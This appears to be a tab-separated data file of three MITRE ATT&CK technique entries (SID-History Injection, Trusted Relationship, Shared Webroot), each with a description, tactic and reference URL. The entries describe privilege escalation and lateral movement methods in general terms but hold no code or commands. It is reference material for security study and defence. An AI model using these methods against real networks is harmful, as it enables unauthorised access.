T1178	SID-History Injection	The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. An account can hold additional SIDs in the SID-History Active Directory attribute, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [[Technique/T1021|Remote Services]], [[Technique/T1077|Windows Admin Shares]], or [[Technique/T1028|Windows Remote Management]].	Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1178
T1199	Trusted Relationship	Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [[Technique/T1078|Valid Accounts]] used by the other party for access to internal network systems may be compromised and used.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1199
T1051	Shared Webroot	Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1051
